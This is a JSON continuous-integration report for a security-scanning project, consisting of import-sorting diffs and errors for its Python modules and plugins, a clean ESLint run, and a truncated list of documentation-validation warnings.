-4,11 +4,12 @@\n Validates documentation files for consistency and quality\n \"\"\"\n \n+import json\n import re\n import sys\n from pathlib import Path\n-from typing import List, Dict\n-import json\n+from typing import Dict, List\n+\n \n class DocumentationValidator:\n     def __init__(self):\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/backend_integration.py:before\t2025-09-14 19:10:58.580755\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/backend_integration.py:after\t2025-09-14 19:23:18.677676\n@@ -3,25 +3,23 @@\n Connects TUI interface with existing scanning functions\n \"\"\"\n \n+import json\n+import logging\n+import os\n+import subprocess\n import sys\n-import os\n+import threading\n+import time\n+from datetime import datetime\n from pathlib import Path\n-import json\n-import threading\n-import subprocess\n-import time\n-import logging\n-from datetime import datetime\n \n # Add parent directory to path for imports\n sys.path.append(str(Path(__file__).parent.parent))\n \n # Import main application functions\n try:\n-    from bl4ckc3ll_p4nth30n import (\n-        load_cfg, env_with_lists, new_run, stage_recon, \n-        stage_vuln_scan, stage_report, logger\n-    )\n+    from bl4ckc3ll_p4nth30n import (env_with_lists, load_cfg, logger, new_run,\n+                                    stage_recon, stage_report, stage_vuln_scan)\n     BACKEND_AVAILABLE = True\n except ImportError:\n     BACKEND_AVAILABLE = False\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/app.py:before\t2025-09-14 19:10:58.580755\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/app.py:after\t2025-09-14 19:23:18.682192\n@@ -3,24 +3,22 @@\n Advanced Terminal User Interface with real-time monitoring and professional layout\n \"\"\"\n \n-from textual.app import App\n-from textual.containers import Container, Horizontal, Vertical\n-from textual.widgets import (\n-    Header, Footer, Static, Button, Input, Log, \n-    DataTable, ProgressBar, Tree, TabbedContent, TabPane\n-)\n-from textual.binding import Binding\n-from textual import on\n import asyncio\n+import logging\n+import os\n+# Import screens locally to avoid circular import issues\n+import sys\n+import threading\n import time\n from datetime import datetime\n-import threading\n-import logging\n+from pathlib import Path\n \n-# Import screens locally to avoid circular import issues\n-import sys\n-import os\n-from pathlib import Path\n+from textual import on\n+from textual.app import App\n+from textual.binding import Binding\n+from textual.containers import Container, Horizontal, Vertical\n+from textual.widgets import (Button, DataTable, Footer, Header, Input, Log,\n+                             ProgressBar, Static, TabbedContent, TabPane, Tree)\n \n # Add parent directory to path for relative imports\n sys.path.append(str(Path(__file__).parent.parent))\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/screens/settings.py:before\t2025-09-14 19:10:58.581755\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/screens/settings.py:after\t2025-09-14 19:23:18.687001\n@@ -3,12 +3,14 @@\n Interactive configuration management\n \"\"\"\n \n-from textual.containers import Container, Horizontal, Vertical\n-from textual.widgets import Static, Button, Label, Input, Select, Checkbox, TabbedContent, TabPane\n-from textual.widget import Widget\n-from textual import on\n import json\n from pathlib import Path\n+\n+from textual import on\n+from textual.containers import Container, Horizontal, Vertical\n+from textual.widget import Widget\n+from textual.widgets import (Button, Checkbox, Input, Label, Select, Static,\n+                             TabbedContent, TabPane)\n \n \n class GeneralSettingsPanel(Static):\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/screens/main_dashboard.py:before\t2025-09-14 19:10:58.580755\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/screens/main_dashboard.py:after\t2025-09-14 19:23:18.690799\n@@ -3,17 +3,18 @@\n Real-time system monitoring and status overview\n \"\"\"\n \n-from textual.containers import Container, Horizontal, Vertical, Grid\n-from textual.widgets import Static, Button, Label, ProgressBar, DataTable\n-from textual.widget import Widget\n-from textual.reactive import reactive\n-from textual import on\n+import os\n import platform\n+import sys\n import time\n from datetime import datetime\n-import os\n-import sys\n from pathlib import Path\n+\n+from textual import on\n+from textual.containers import Container, Grid, Horizontal, Vertical\n+from textual.reactive import reactive\n+from textual.widget import Widget\n+from textual.widgets import Button, DataTable, Label, ProgressBar, Static\n \n # Try to import psutil, fallback gracefully\n try:\n@@ -24,7 +25,8 @@\n \n # Import backend integration\n try:\n-    from ..backend_integration import scan_manager, config_manager, target_manager, report_manager\n+    from ..backend_integration import (config_manager, report_manager,\n+                                       scan_manager, target_manager)\n     HAS_BACKEND = True\n except ImportError:\n     HAS_BACKEND = False\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/screens/scan_runner.py:before\t2025-09-14 19:10:58.581755\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/screens/scan_runner.py:after\t2025-09-14 19:23:18.695215\n@@ -3,14 +3,16 @@\n Interactive scanning interface with real-time progress\n \"\"\"\n \n-from textual.containers import Container, Horizontal, Vertical\n-from textual.widgets import Static, Button, Label, ProgressBar, Log, Select, Input\n-from textual.widget import Widget\n-from textual import on\n import asyncio\n import threading\n import time\n from datetime import datetime\n+\n+from textual import on\n+from textual.containers import Container, Horizontal, Vertical\n+from textual.widget import Widget\n+from textual.widgets import (Button, Input, Label, Log, ProgressBar, Select,\n+                             Static)\n \n # Import backend integration\n try:\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/screens/targets.py:before\t2025-09-14 19:10:58.581755\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/screens/targets.py:after\t2025-09-14 19:23:18.698961\n@@ -3,13 +3,14 @@\n Interactive target management with validation\n \"\"\"\n \n+import logging\n+import re\n+from pathlib import Path\n+\n+from textual import on\n from textual.containers import Container, Horizontal, Vertical\n-from textual.widgets import Static, Button, Label, Input, DataTable, TextArea\n from textual.widget import Widget\n-from textual import on\n-from pathlib import Path\n-import re\n-import logging\n+from textual.widgets import Button, DataTable, Input, Label, Static, TextArea\n \n \n class TargetInputPanel(Static):\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/screens/reports.py:before\t2025-09-14 19:10:58.581755\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/screens/reports.py:after\t2025-09-14 19:23:18.702696\n@@ -3,13 +3,14 @@\n View and manage security assessment reports\n \"\"\"\n \n+import json\n+from datetime import datetime\n+from pathlib import Path\n+\n+from textual import on\n from textual.containers import Container, Horizontal, Vertical\n-from textual.widgets import Static, Button, Label, DataTable, Tree, Select\n from textual.widget import Widget\n-from textual import on\n-from pathlib import Path\n-from datetime import datetime\n-import json\n+from textual.widgets import Button, DataTable, Label, Select, Static, Tree\n \n \n class ReportListPanel(Static):\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/widgets/system_monitor.py:before\t2025-09-14 19:10:58.581755\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/widgets/system_monitor.py:after\t2025-09-14 19:23:18.704672\n@@ -3,10 +3,11 @@\n Real-time system resource monitoring\n \"\"\"\n \n-from textual.widgets import Static, ProgressBar, Label\n+import threading\n+import time\n+\n from textual.containers import Vertical\n-import time\n-import threading\n+from textual.widgets import Label, ProgressBar, Static\n \n \n class SystemMonitor(Static):\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/widgets/log_viewer.py:before\t2025-09-14 19:10:58.581755\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/widgets/log_viewer.py:after\t2025-09-14 19:23:18.706721\n@@ -3,12 +3,13 @@\n Real-time log display and filtering\n \"\"\"\n \n-from textual.widgets import Static, Log, Label, Input, Select\n-from textual.containers import Vertical, Horizontal\n+import queue\n+import threading\n+from datetime import datetime\n+\n from textual import on\n-from datetime import datetime\n-import threading\n-import queue\n+from textual.containers import Horizontal, Vertical\n+from textual.widgets import Input, Label, Log, Select, Static\n \n \n class LogViewer(Static):\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/widgets/scan_progress.py:before\t2025-09-14 19:10:58.581755\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/widgets/scan_progress.py:after\t2025-09-14 19:23:18.708143\n@@ -3,9 +3,9 @@\n Real-time scanning progress display\n \"\"\"\n \n-from textual.widgets import Static, ProgressBar, Label\n from textual.containers import Vertical\n from textual.reactive import reactive\n+from textual.widgets import Label, ProgressBar, Static\n \n \n class ScanProgress(Static):\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/plugins/nuclei_template_manager.py:before\t2025-09-14 19:10:58.579755\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/plugins/nuclei_template_manager.py:after\t2025-09-14 19:23:18.713175\n@@ -1,12 +1,13 @@\n # Plugin: Enhanced Nuclei Template Manager\n # Advanced nuclei template management and community integration\n-from pathlib import Path\n-from typing import Dict, Any, List\n import json\n import subprocess\n import time\n+from pathlib import Path\n+from typing import Any, Dict, List\n+from urllib.parse import urlparse\n+\n import requests\n-from urllib.parse import urlparse\n import yaml\n \n plugin_info = {\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/plugins/advanced_osint.py:before\t2025-09-14 19:10:58.579755\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/plugins/advanced_osint.py:after\t2025-09-14 19:23:18.718071\n@@ -1,10 +1,10 @@\n # Plugin: Advanced OSINT\n # Provides enhanced open-source intelligence gathering capabilities\n-from pathlib import Path\n-from typing import Dict, Any\n import json\n import subprocess\n import time\n+from pathlib import Path\n+from typing import Any, Dict\n from urllib.parse import urlparse\n \n plugin_info = {\n@@ -106,8 +106,8 @@\n     \n     try:\n         # Use crt.sh API for certificate transparency\n+        import urllib.parse\n         import urllib.request\n-        import urllib.parse\n         \n         url = f\"https://crt.sh/?q=%.{domain}&output=json\"\n         \n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/plugins/api_security_scanner.py:before\t2025-09-14 19:10:58.579755\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/plugins/api_security_scanner.py:after\t2025-09-14 19:23:18.723581\n@@ -1,12 +1,12 @@\n # Plugin: API Security Scanner\n # Advanced API security testing and vulnerability detection\n-from pathlib import Path\n-from typing import Dict, Any, List\n import json\n+import re\n import subprocess\n import time\n-from urllib.parse import urlparse, urljoin\n-import re\n+from pathlib import Path\n+from typing import Any, Dict, List\n+from urllib.parse import urljoin, urlparse\n \n plugin_info = {\n     \"name\": \"API Security Scanner\",\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/plugins/cloud_security_scanner.py:before\t2025-09-14 19:10:58.579755\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/plugins/cloud_security_scanner.py:after\t2025-09-14 19:23:18.730449\n@@ -1,12 +1,12 @@\n # Plugin: Cloud Security Scanner\n # Comprehensive cloud security assessment for AWS, Azure, GCP\n-from pathlib import Path\n-from typing import Dict, Any, List\n import json\n+import re\n import subprocess\n import time\n+from pathlib import Path\n+from typing import Any, Dict, List\n from urllib.parse import urlparse\n-import re\n \n plugin_info = {\n     \"name\": \"Cloud Security Scanner\",\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/plugins/enhanced_fuzzing.py:before\t2025-09-14 19:10:58.579755\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/plugins/enhanced_fuzzing.py:after\t2025-09-14 19:23:18.735855\n@@ -1,11 +1,11 @@\n # Plugin: Enhanced Fuzzing Suite\n # Comprehensive fuzzing with multiple tools and advanced wordlists\n-from pathlib import Path\n-from typing import Dict, Any, List\n import json\n+import shutil\n import subprocess\n import time\n-import shutil\n+from pathlib import Path\n+from typing import Any, Dict, List\n \n plugin_info = {\n     \"name\": \"Enhanced Fuzzing Suite\",\nSkipped 1 files\n",
      "stderr": "ERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/success_rate_validation.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/bl4ckc3ll_p4nth30n.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/performance_monitor.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/final_integration_test.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/cicd_integration.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_wordlists.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/config_validator.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/test_automation_integration.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/bcar.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/fallback_scanner.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_tool_manager.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/test_installation.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_test_suite.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/demo_enhanced_reporting.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/security_utils.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/test_enhanced_reporting.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_scanner.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/success_rate_orchestrator.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_report_controller.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/bl4ckc3ll_pantheon_master.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/comprehensive_test_suite.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/quick_functional_test.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_validation.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_scanning.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/diagnostics.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/security_monitor.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/error_handler.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/intelligent_report_engine.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/success_rate_optimizer.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/master_workflow_automation.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/intelligent_debugger.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/comprehensive_test_framework.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/performance_tester.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/intelligent_repo_manager.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/security_validator.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/scripts/docs_validator.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/backend_integration.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/app.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/screens/settings.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/screens/main_dashboard.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/screens/scan_runner.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/screens/targets.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/screens/reports.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/widgets/system_monitor.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/widgets/log_viewer.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/widgets/scan_progress.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/plugins/nuclei_template_manager.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/plugins/advanced_osint.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/plugins/api_security_scanner.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/plugins/cloud_security_scanner.py Imports are incorrectly sorted and/or formatted.\nERROR: /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/plugins/enhanced_fuzzing.py Imports are incorrectly sorted and/or formatted.\n",
      "timestamp": "2025-09-14T19:23:18.752276"
    },
    {
      "name": "ESLint JavaScript Linting",
      "success": true,
      "duration": 0.5180726051330566,
      "returncode": 0,
      "stdout": "\n> bl4ckc3ll-pantheon@2.0.0 lint:check\n> eslint --ext .js . || echo 'No JS files found to lint'\n\n",
      "stderr": "",
      "timestamp": "2025-09-14T19:23:19.270549"
    }
  ],
  "documentation_validation": {
    "name": "Documentation Validation",
    "success": false,
    "duration": 0.09956693649291992,
    "returncode": 1,
    "stdout": "\ud83d\udcda Running Documentation Validation...\n\u26a0\ufe0f  Found 854 documentation issues:\n  - WARNING: Heading level skip in README.md (line with 'CI/CD Integration')\n  - WARNING: Heading level skip in README.md (line with 'BCAR Enhanced Reconnaissance')\n  - WARNING: Code block without language specification in README.md\n  - WARNING: Code block without language specification in README.md\n  - WARNING: Code block without language specification in README.md\n  - WARNING: Code block without language specification in README.md\n  - WARNING: Code block without language specification in README.md\n  - WARNING: Code block without language specification in README.md\n  - WARNING: Code block without language specification in README.md\n  - WARNING: Code block without language specification in README.md\n  - WARNING: Code block without language specification in README.md\n  - WARNING: Code block without language specification in README.md\n  - WARNING: Code block without language specification in README.md\n  - WARNING: Code block without language specification in README.md\n  - WARNING: Code block without language specification in README.md\n  - WARNING: Code block without language specification in USAGE_GUIDE.md\n  - WARNING: Code block without language specification in USAGE_GUIDE.md\n  - WARNING: Code block without language specification in USAGE_GUIDE.md\n  - WARNING: Code block without language specification in USAGE_GUIDE.md\n  - WARNING: Code block without language specification in USAGE_GUIDE.md\n  - WARNING: Code block without language specification in USAGE_GUIDE.md\n  - WARNING: Code block without language specification in USAGE_GUIDE.md\n  - WARNING: Code block without language specification in USAGE_GUIDE.md\n  - WARNING: Code block without language specification in USAGE_GUIDE.md\n  - WARNING: Code block without language specification in USAGE_GUIDE.md\n  - WARNING: Code block without language specification in USAGE_GUIDE.md\n  - WARNING: Code block without language specification in USAGE_GUIDE.md\n  - WARNING: Code block without language specification in USAGE_GUIDE.md\n  - WARNING: Code block without language specification in USAGE_GUIDE.md\n  - WARNING: Code block without language specification in USAGE_GUIDE.md\n  - WARNING: Code block without language specification in USAGE_GUIDE.md\n  - WARNING: Code block without language specification in USAGE_GUIDE.md\n  - WARNING: Code block without language specification in USAGE_GUIDE.md\n  - WARNING: Code block without language specification in USAGE_GUIDE.md\n  - WARNING: Code block without language specification in USAGE_GUIDE.md\n  - WARNING: Code block without language specification in USAGE_GUIDE.md\n  - WARNING: Heading level skip in BCAR_USAGE_GUIDE.md (line with '2. Launch Framework')\n  - WARNING: Heading level skip in BCAR_USAGE_GUIDE.md (line with '2. Standalone BCAR Module')\n  - WARNING: Heading level skip in BCAR_USAGE_GUIDE.md (line with '3. Configuration Customization')\n  - WARNING: Code block without language specification in BCAR_USAGE_GUIDE.md\n  - WARNING: Code block without language specification in BCAR_USAGE_GUIDE.md\n  - WARNING: Code block without language specification in BCAR_USAGE_GUIDE.md\n  - WARNING: Code block without language specification in BCAR_USAGE_GUIDE.md\n  - WARNING: Code block without language specification in BCAR_USAGE_GUIDE.md\n  - WARNING: Code block without language specification in BCAR_USAGE_GUIDE.md\n  - WARNING: Code block without language specification in BCAR_USAGE_GUIDE.md\n  - WARNING: Code block without language specification in BCAR_USAGE_GUIDE.md\n  - WARNING: Code block without language specification in BCAR_USAGE_GUIDE.md\n  - WARNING: Code block without language specification in BCAR_USAGE_GUIDE.md\n  - WARNING: Code block without language specification in BCAR_USAGE_GUIDE.md\n  - WARNING: Code block without language specification in node_modules/find-up/readme.md\n  - WARNING: Code block without language specification in node_modules/find-up/readme.md\n  - WARNING: Code block without language specification in node_modules/find-up/readme.md\n  - WARNING: Code block without language specification in node_modules/find-up/readme.md\n  - WARNING: Code block without language specification in node_modules/find-up/readme.md\n  - WARNING: Code block without language specification in node_modules/find-up/readme.md\n  - WARNING: Code block without language specification in node_modules/ms/readme.md\n  - WARNING: Code block without language specification in node_modules/ms/readme.md\n  - WARNING: Code block without language specification in node_modules/ms/readme.md\n  - WARNING: Code block without language specification in node_modules/fast-json-stable-stringify/README.md\n  - WARNING: Code block without language specification in node_modules/fast-json-stable-stringify/README.md\n  - WARNING: Code block without language specification in node_modules/fast-json-stable-stringify/README.md\n  - WARNING: Code block without language specification in node_modules/fast-json-stable-stringify/README.md\n  - WARNING: Code block without language specification in node_modules/fast-json-stable-stringify/README.md\n  - WARNING: Code block without language specification in node_modules/fast-json-stable-stringify/README.md\n  - WARNING: Code block without language specification in node_modules/fast-json-stable-stringify/README.md\n  - WARNING: Code block without language specification in node_modules/fast-json-stable-stringify/README.md\n  - WARNING: Code block without language specification in node_modules/fast-json-stable-stringify/README.md\n  - WARNING: Code block without language specification in node_modules/fast-json-stable-stringify/README.md\n  - WARNING: Code block without language specification in node_modules/fast-json-stable-stringify/README.md\n  - WARNING: Code block without language specification in node_modules/fast-json-stable-stringify/README.md\n  - WARNING: Code block without language specification in node_modules/fast-json-stable-stringify/README.md\n  - WARNING: Code block without language specification in node_modules/fast-json-stable-stringify/README.md\n  - WARNING: Code block without language specification in node_modules/fast-json-stable-stringify/README.md\n  - WARNING: Code block without language specification in node_modules/fast-json-stable-stringify/README.md\n  - WARNING: Code block without language specification in node_modules/fast-json-stable-stringify/README.md\n  - WARNING: Code block without language specification in node_modules/fast-json-stable-stringify/README.md\n  - WARNING: Code block without language specification in node_modules/p-locate/readme.md\n  - WARNING: Code block without language specification in node_modules/p-locate/readme.md\n  - WARNING: Code block without language specification in node_modules/p-locate/readme.md\n  - ERROR: Broken internal link in node_modules/argparse/README.md: ./doc\n  - ERROR: Broken internal link in node_modules/argparse/README.md: ./doc\n  - WARNING: Code block without language specification in node_modules/argparse/README.md\n  - WARNING: Code block without language specification in node_modules/argparse/README.md\n  - WARNING: Code block without language specification in node_modules/argparse/README.md\n  - WARNING: Code block without language specification in node_modules/argparse/README.md\n  - WARNING: Code block without language specification in node_modules/argparse/README.md\n  - ERROR: Broken internal link in 